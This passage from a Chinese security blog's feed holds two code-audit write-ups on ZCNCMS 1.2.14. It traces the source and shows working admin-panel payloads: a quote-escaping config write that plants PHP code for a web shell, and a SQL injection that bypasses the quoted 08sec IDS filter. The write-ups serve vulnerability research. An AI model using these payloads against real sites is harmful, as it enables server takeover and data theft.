class="line">	<span class="variable">$rs_msg</span> = <span class="variable">$STR</span>-&gt;safe(<span class="variable">$info</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$FS</span>-&gt;file_Write(<span class="variable">$rs_msg</span>, WEB_INC.<span class="string">'sys.inc.php'</span>, <span class="string">'sys'</span>)) &#123;</span><br><span class="line">		errorInfo(<span class="string">'编辑成功'</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		errorInfo();</span><br></pre></td></tr></table></figure></p>
<p>可编辑网站的基本信息并且存入sys.inc.php，<code>$rs_msg = $STR-&gt;safe($info);</code>但是$info经过了safe函数，我们跟踪safe函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">(<span class="variable">$msg</span>)</span></span><br><span class="line">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable">$msg</span> &amp;&amp; <span class="variable">$msg</span> != <span class="string">'0'</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(is_array(<span class="variable">$msg</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">foreach</span>(<span class="variable">$msg</span> <span class="keyword">AS</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="variable">$msg</span>[<span class="variable">$key</span>] = <span class="variable">$this</span>-&gt;safe(<span class="variable">$value</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$msg</span> = trim(<span class="variable">$msg</span>);</span><br><span class="line">			<span class="comment">//$old = array("&amp;amp;","&amp;nbsp;","'",'"',"\t","\r");</span></span><br><span class="line">			<span class="comment">//$new = array("&amp;"," ","&amp;#39;","&amp;quot;","&amp;nbsp; &amp;nbsp; ","");</span></span><br><span class="line">			<span class="variable">$old</span> = <span class="keyword">array</span>(<span class="string">"&amp;amp;"</span>,<span class="string">"&amp;nbsp;"</span>,<span class="string">"'"</span>,<span class="string">'"'</span>,<span class="string">"\t"</span>);</span><br><span class="line">			<span class="variable">$new</span> = <span class="keyword">array</span>(<span class="string">"&amp;"</span>,<span class="string">" "</span>,<span class="string">"&amp;#39;"</span>,<span class="string">"&amp;quot;"</span>,<span class="string">"&amp;nbsp; &amp;nbsp; "</span>);</span><br><span class="line">			<span class="variable">$msg</span> = str_replace(<span class="variable">$old</span>,<span class="variable">$new</span>,<span class="variable">$msg</span>);</span><br><span class="line">			<span class="variable">$msg</span> = str_replace(<span class="string">"   "</span>,<span class="string">"&amp;nbsp; &amp;nbsp;"</span>,<span class="variable">$msg</span>);</span><br><span class="line">			<span class="variable">$old</span> = <span class="keyword">array</span>(<span class="string">"/&lt;script(.*)&lt;\/script&gt;/isU"</span>,<span class="string">"/&lt;frame(.*)&gt;/isU"</span>,<span class="string">"/&lt;\/fram(.*)&gt;/isU"</span>,<span class="string">"/&lt;iframe(.*)&gt;/isU"</span>,<span class="string">"/&lt;\/ifram(.*)&gt;/isU"</span>,<span class="string">"/&lt;style(.*)&lt;\/style&gt;/isU"</span>);</span><br><span class="line">			<span class="variable">$new</span> = <span class="keyword">array</span>(<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line">			<span class="variable">$msg</span> = preg_replace(<span class="variable">$old</span>,<span class="variable">$new</span>,<span class="variable">$msg</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$msg</span>;</span><br></pre></td></tr></table></figure></p>
<p>safe函数过滤了单双引号及常见的xss，我们再看看sys.inc.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="variable">$sys</span>[<span class="string">"isclose"</span>] = <span class="string">'0'</span>;</span><br><span class="line"><span class="variable">$sys</span>[<span class="string">"closeinfo"</span>] = <span class="string">'comming soon'</span>;</span><br><span class="line"><span class="variable">$sys</span>[<span class="string">"webtitle"</span>] = <span class="string">'ZCNCMS'</span>;</span><br><span class="line"><span class="variable">$sys</span>[<span class="string">"indextitle"</span>] = <span class="string">'ZCNCMS专注内容'</span>;</span><br><span class="line"><span class="variable">$sys</span>[<span class="string">"webkeywords"</span>] = <span class="string">'ZCNCMS专注内容'</span>;</span><br><span class="line"><span class="variable">$sys</span>[<span class="string">"webdescription"</span>] = <span class="string">'ZCNCMS专注内容'</span>;</span><br><span class="line"><span class="variable">$sys</span>[<span class="string">"webcopyright"</span>] = <span class="string">'Copyright+©+1996-2012,+All+Rights+Reserved+ZCNCMS'</span>;</span><br><span class="line"><span class="variable">$sys</span>[<span class="string">"webbeian"</span>] = <span class="string">'ZCNCMS专注内容'</span>;</span><br><span class="line"><span class="variable">$sys</span>[<span class="string">"systemplates"</span>] = <span class="string">'default'</span>;</span><br><span class="line"><span class="variable">$sys</span>[<span class="string">"linkurlmode"</span>] = <span class="string">'0'</span>;</span><br><span class="line"></span><br><span class="line"> <span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>我们继续跟踪sys.php中的写函数，<code>file_Write()-&gt;_write()</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//写入信息</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">_write</span><span class="params">(<span class="variable">$content</span>,<span class="variable">$file</span>,<span class="variable">$type</span>=<span class="string">"wb"</span>)</span></span><br><span class="line">	</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$system_time</span>;</span><br><span class="line">		<span class="variable">$content</span> = stripslashes(<span class="variable">$content</span>);</span><br><span class="line">		<span class="variable">$handle</span> = <span class="variable">$this</span>-&gt;_open(<span class="variable">$file</span>,<span class="variable">$type</span>);</span><br><span class="line">		@fwrite(<span class="variable">$handle</span>,<span class="variable">$content</span>);</span><br><span class="line">		<span class="keyword">unset</span>(<span class="variable">$content</span>);</span><br><span class="line">		<span class="variable">$this</span>-&gt;close(<span class="variable">$handle</span>);</span><br><span class="line">		<span class="comment">//设置文件创建的时间</span></span><br><span class="line">		<span class="variable">$system_time</span> = <span class="variable">$system_time</span> ? <span class="variable">$system_time</span> : time();</span><br><span class="line">		@touch(<span class="variable">$file</span>,<span class="variable">$system_time</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>发现经过一系列的安全处理后，写入前会进行stripslashes操作,但是之前单引号被替换了。这里想到了<code>\</code><br>我们呢可以这样构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8088/code_audit/zcncms/admin/?c=sys&#10;POST:&#10;isclose=0&#38;closeinfo=1\&#38;webtitle=;phpinfo();//&#38;indextitle=ZCNCMS%E4%B8%93%E6%B3%A8%E5%86%85%E5%AE%B9&#38;webkeywords=ZCNCMS%E4%B8%93%E6%B3%A8%E5%86%85%E5%AE%B9&#38;webdescription=ZCNCMS%E4%B8%93%E6%B3%A8%E5%86%85%E5%AE%B9&#38;webbeian=ZCNCMS%E4%B8%93%E6%B3%A8%E5%86%85%E5%AE%B9&#38;webcopyright=Copyright+%C2%A9+1996-2012%2C+All+Rights+Reserved+ZCNCMS&#38;linkurlmode=0&#38;systemplates=default&#38;submit=%E7%BC%96%E8%BE%91</span><br></pre></td></tr></table></figure></p>
<p>将$sys[“closeinfo”]后面的单引号转义，使之和$sys[“webtitle”]的第一个单引号闭合，这样$sys[“webtitle”]的值就摆脱了单引号，再利用注释符”//“注释掉后面的单引号，中间直接可以写shell。执行完成后sys.inc.php如下<br><img src="https://img.alicdn.com/imgextra/i2/792076116/TB2aPrCuXXXXXbtXpXXXXXXXXXX_!!792076116.png" alt=""></p>
<p>成功getshell</p>
<p><img src="https://img.alicdn.com/imgextra/i2/792076116/TB2iFDQuXXXXXXyXpXXXXXXXXXX_!!792076116.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;接上一篇 &lt;a href=&quot;http://wps2015.org/2016/08/05/code%20audit%20of%20zcncms/&quot;&gt;代码审计——zcncms后台SQL注入(一)&lt;/a&gt;， 继续挖掘出zcncms的几处漏洞.
    
    </summary>
    
      <category term="安全笔记" scheme="http://das.scusec.org/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="php" scheme="http://das.scusec.org/tags/php/"/>
    
      <category term="wps2015" scheme="http://das.scusec.org/tags/wps2015/"/>
    
  </entry>
  
  <entry>
    <title>代码审计——zcncms后台SQL注入(一)</title>
    <link href="http://das.scusec.org/2016/08/23/code-audit-of-zcncms1/"/>
    <id>http://das.scusec.org/2016/08/23/code-audit-of-zcncms1/</id>
    <published>2016-08-22T16:00:00.000Z</published>
    <updated>2016-08-23T02:42:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>由于是后台注入，比较鸡肋，发上来供大家相互参考学习。zcncms版本1.2.14，官方网站地址：<br><a href="http://www.zcncms.com/" target="_blank" rel="external">zcncms</a><a id="more"></a></p>
<h4 id="0x01-变量处理"><a href="#0x01-变量处理" class="headerlink" title="0x01 变量处理"></a>0x01 变量处理</h4><p>文件/include/common.inc.php中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//检查和注册外部提交的变量</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$_k</span>=&gt;<span class="variable">$_v</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//if( strlen($_k)&gt;0 &amp;&amp; eregi('^(GLOBALS)',$_k) )</span></span><br><span class="line">	<span class="keyword">if</span>( strlen(<span class="variable">$_k</span>)&gt;<span class="number">0</span> &amp;&amp; preg_match(<span class="string">'/^(GLOBALS)/i'</span>,<span class="variable">$_k</span>) )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">'Request var not allow!'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line"><span class="comment">//foreach(Array('_GET','_POST','_COOKIE') as $_request) 取消cookie自动生成变量</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">Array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>) <span class="keyword">as</span> <span class="variable">$_request</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>) &#123;</span><br><span class="line">		<span class="comment">//------------------20130128校验变量名</span></span><br><span class="line">		<span class="keyword">if</span>(strstr(<span class="variable">$_k</span>, <span class="string">'_'</span>) == <span class="variable">$_k</span>)&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'code:re_all'</span>;</span><br><span class="line">			<span class="keyword">exit</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//可考虑增加变量检测，减少变量覆盖</span></span><br><span class="line">		<span class="comment">//--------------------------</span></span><br><span class="line">		$&#123;<span class="variable">$_k</span>&#125; = _GetRequest(<span class="variable">$_v</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>过滤变量的key是”_p”和”GLOBALS p”的形式，防止全局变量覆盖；并在函数<code>_GetRequest()</code>中进行了addslashes的操作。了解了上面的情况，那么有什么可利用的点就比较清楚了。</p>
<h4 id="0x02-未正确过滤"><a href="#0x02-未正确过滤" class="headerlink" title="0x02 未正确过滤"></a>0x02 未正确过滤</h4><p>文件/module/menus/admincontroller/menus.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'edit'</span>:<span class="comment">//</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$submit</span>))&#123;</span><br><span class="line">    <span class="variable">$info</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$time</span> = time();</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$id</span>))&#123;</span><br><span class="line">      <span class="variable">$id</span> = intval(<span class="variable">$id</span>);</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$id</span> &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">        errorinfo(<span class="string">'变量错误'</span>,<span class="string">''</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="variable">$infoold</span> = <span class="variable">$menus</span>-&gt;GetInfo(<span class="string">''</span>,<span class="string">' id = '</span>.<span class="variable">$id</span>);</span><br><span class="line">      <span class="comment">//改变分类从属判断</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$parentid</span> != <span class="variable">$infoold</span>[<span class="string">'parentid'</span>]) &#123;  <span class="comment">//毫无意义的比较</span></span><br><span class="line">        <span class="variable">$List</span> = <span class="variable">$menus</span>-&gt;GetList(<span class="string">''</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="string">" parentid = $id "</span>,<span class="string">''</span>); <span class="comment">//恰当的id</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$List</span>)) &#123;</span><br><span class="line">          errorinfo(<span class="string">'对不起，该导航('</span>.<span class="variable">$id</span>.<span class="string">')下有子导航'</span>,<span class="string">''</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//分析根分类</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$parentid</span> == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="variable">$rootid</span> = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$parent</span> = <span class="variable">$menus</span>-&gt;GetInfo(<span class="string">''</span>,<span class="string">' id = '</span>.<span class="variable">$parentid</span>); <span class="comment">//没有单引号</span></span><br></pre></td></tr></table></figure></p>
<p>在$parentid != $infoold[‘parentid’]中，用的’!=’，很明显如果我们要控制$parentid的值，这个不等式肯定成立。但是errorinfo会使程序退出，所以这里需要一个在数据库不存在的parentid，使得取出$List为空，从而进入下面的sql操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$parent = $menus-&#62;GetInfo(&#39;&#39;,&#39; id = &#39;.$parentid);</span><br></pre></td></tr></table></figure></p>
<h4 id="0x03-全局过滤（08sec-ids）"><a href="#0x03-全局过滤（08sec-ids）" class="headerlink" title="0x03 全局过滤（08sec ids）"></a>0x03 全局过滤（08sec ids）</h4><p>在进行尝试的时候，发现了sql执行居然还有过滤</p>
<p><img src="https://img.alicdn.com/imgextra/i4/792076116/TB2wu4nuXXXXXXfXXXXXXXXXXXX_!!792076116.png" alt="test"><br>追踪sql语句执行函数，GetInfo()-&gt;Execute()-&gt;option()-&gt;SafeSql()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SafeSql</span><span class="params">(<span class="variable">$db_string</span>,<span class="variable">$querytype</span>=<span class="string">'select'</span>)</span></span>&#123;</span><br><span class="line">		<span class="comment">//var_dump($db_string);</span></span><br><span class="line">		<span class="comment">//完整的SQL检查</span></span><br><span class="line">		<span class="comment">//$pos = '';</span></span><br><span class="line">		<span class="comment">//$old_pos = '';</span></span><br><span class="line">		<span class="variable">$pos</span> = <span class="number">0</span>;</span><br><span class="line">		<span class="variable">$old_pos</span> = <span class="number">0</span>;</span><br><span class="line">		<span class="variable">$clean</span> = <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$db_string</span>))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">true</span>)&#123;			</span><br><span class="line">			<span class="variable">$pos</span> = strpos(<span class="variable">$db_string</span>, <span class="string">'\''</span>, <span class="variable">$pos</span> + <span class="number">1</span>);</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$pos</span> === <span class="keyword">false</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$clean</span> .= substr(<span class="variable">$db_string</span>, <span class="variable">$old_pos</span>, <span class="variable">$pos</span> - <span class="variable">$old_pos</span>);</span><br><span class="line">			<span class="keyword">while</span> (<span class="keyword">true</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="variable">$pos1</span> = strpos(<span class="variable">$db_string</span>, <span class="string">'\''</span>, <span class="variable">$pos</span> + <span class="number">1</span>);</span><br><span class="line">				<span class="variable">$pos2</span> = strpos(<span class="variable">$db_string</span>, <span class="string">'\\'</span>, <span class="variable">$pos</span> + <span class="number">1</span>);</span><br><span class="line">				<span class="keyword">if</span> (<span class="variable">$pos1</span> === <span class="keyword">false</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">elseif</span> (<span class="variable">$pos2</span> == <span class="keyword">false</span> || <span class="variable">$pos2</span> &gt; <span class="variable">$pos1</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="variable">$pos</span> = <span class="variable">$pos1</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="variable">$pos</span> = <span class="variable">$pos2</span> + <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$clean</span> .= <span class="string">'$s$'</span>;</span><br><span class="line">			<span class="variable">$old_pos</span> = <span class="variable">$pos</span> + <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$clean</span> .= substr(<span class="variable">$db_string</span>, <span class="variable">$old_pos</span>);</span><br><span class="line">		<span class="variable">$clean</span> = trim(strtolower(preg_replace(<span class="keyword">array</span>(<span class="string">'~\s+~s'</span> ), <span class="keyword">array</span>(<span class="string">' '</span>), <span class="variable">$clean</span>)));</span><br><span class="line"></span><br><span class="line">		<span class="comment">//老版本的Mysql并不支持union，常用的程序里也不使用union，但是一些黑客使用它，所以检查它</span></span><br><span class="line">		<span class="keyword">if</span> (strpos(<span class="variable">$clean</span>, <span class="string">'union'</span>) !== <span class="keyword">false</span> &amp;&amp; preg_match(<span class="string">'~(^|[^a-z])union($|[^[a-z])~s'</span>, <span class="variable">$clean</span>) != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$fail</span> = <span class="keyword">true</span>;</span><br><span class="line">			<span class="variable">$error</span>=<span class="string">"union detect"</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//发布版本的程序可能比较少包括--,#这样的注释，但是黑客经常使用它们</span></span><br><span class="line">		<span class="keyword">elseif</span> (strpos(<span class="variable">$clean</span>, <span class="string">'/*'</span>) &gt; <span class="number">2</span> || strpos(<span class="variable">$clean</span>, <span class="string">'--'</span>) !== <span class="keyword">false</span> || strpos(<span class="variable">$clean</span>, <span class="string">'#'</span>) !== <span class="keyword">false</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$fail</span> = <span class="keyword">true</span>;</span><br><span class="line">			<span class="variable">$error</span>=<span class="string">"comment detect"</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//这些函数不会被使用，但是黑客会用它来操作文件，down掉数据库</span></span><br><span class="line">		<span class="keyword">elseif</span> (strpos(<span class="variable">$clean</span>, <span class="string">'sleep'</span>) !== <span class="keyword">false</span> &amp;&amp; preg_match(<span class="string">'~(^|[^a-z])sleep($|[^[a-z])~s'</span>, <span class="variable">$clean</span>) != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$fail</span> = <span class="keyword">true</span>;</span><br><span class="line">			<span class="variable">$error</span>=<span class="string">"slown down detect"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">elseif</span> (strpos(<span class="variable">$clean</span>, <span class="string">'benchmark'</span>) !== <span class="keyword">false</span> &amp;&amp; preg_match(<span class="string">'~(^|[^a-z])benchmark($|[^[a-z])~s'</span>, <span class="variable">$clean</span>) != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$fail</span> = <span class="keyword">true</span>;</span><br><span class="line">			<span class="variable">$error</span>=<span class="string">"slown down detect"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">elseif</span> (strpos(<span class="variable">$clean</span>, <span class="string">'load_file'</span>) !== <span class="keyword">false</span> &amp;&amp; preg_match(<span class="string">'~(^|[^a-z])load_file($|[^[a-z])~s'</span>, <span class="variable">$clean</span>) != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$fail</span> = <span class="keyword">true</span>;</span><br><span class="line">			<span class="variable">$error</span>=<span class="string">"file fun detect"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">elseif</span> (strpos(<span class="variable">$clean</span>, <span class="string">'into outfile'</span>) !== <span class="keyword">false</span> &amp;&amp; preg_match(<span class="string">'~(^|[^a-z])into\s+outfile($|[^[a-z])~s'</span>, <span class="variable">$clean</span>) != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$fail</span> = <span class="keyword">true</span>;</span><br><span class="line">			<span class="variable">$error</span>=<span class="string">"file fun detect"</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//老版本的MYSQL不支持子查询，我们的程序里可能也用得少，但是黑客可以使用它来查询数据库敏感信息</span></span><br><span class="line">		<span class="keyword">elseif</span> (preg_match(<span class="string">'~\([^)]*?select~s'</span>, <span class="variable">$clean</span>) != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$fail</span> = <span class="keyword">true</span>;</span><br><span class="line">			<span class="variable">$error</span>=<span class="string">"sub select detect"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$fail</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//fputs(fopen($log_file,'a+'),"$userIP||$getUrl||$db_string||$error\r\n");</span></span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">"&lt;font size='5' color='red'&gt;Safe Alert: Request Error step 2!&lt;/font&gt;"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$db_string</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>从代码和警告信息来看，是08sec的通用ids无疑，包括dedecms等内置这个这段代码。网上已经有较多的绕过方式。<br>构造payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zcncms/admin/?c=products_class&#38;a=edit&#38;id=1&#10;POST:&#10;submit=&#38;parentid=12=@`\\\&#39;`  and 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1));#@`\\\&#39;`</span><br></pre></td></tr></table></figure></p>
<p><img src="https://img.alicdn.com/imgextra/i3/792076116/TB27vUOtVXXXXaOXpXXXXXXXXXX_!!792076116.png" alt=""></p>
<h4 id="0x04-多处类似处理不当"><a href="#0x04-多处类似处理不当" class="headerlink" title="0x04 多处类似处理不当"></a>0x04 多处类似处理不当</h4><p>搜索了一下代码，发现多处parentid处理不当，不过都需要后台权限</p>
<p><img src="https://img.alicdn.com/imgextra/i3/792076116/TB2vro2tVXXXXXRXpXXXXXXXXXX_!!792076116.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;由于是后台注入，比较鸡肋，发上来供大家相互参考学习。zcncms版本1.2.14，官方网站地址：&lt;br&gt;&lt;a href=&quot;http://www.zcncms.com/&quot;&gt;zcncms&lt;/a&gt;
    
    </summary>
    
      <category term="安全笔记" scheme="http://das.scusec.org/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="php" scheme="http://das.scusec.org/tags/php/"/>
    
      <category term="wps2015" scheme="http://das.scusec.org/tags/wps2015/"/>
    
  </entry>
  
  <entry>
    <title>自定义右键菜单学习</title>
    <link href="http://das.scusec.org/2016/07/22/context-menu/"/>
    <id>http://das.scusec.org/2016/07/22/context-menu/</id>
    <published>2016-07-22T04:09:54.000Z</published>
    <updated>2016-07-28T07:11:50.000Z</updated>
    
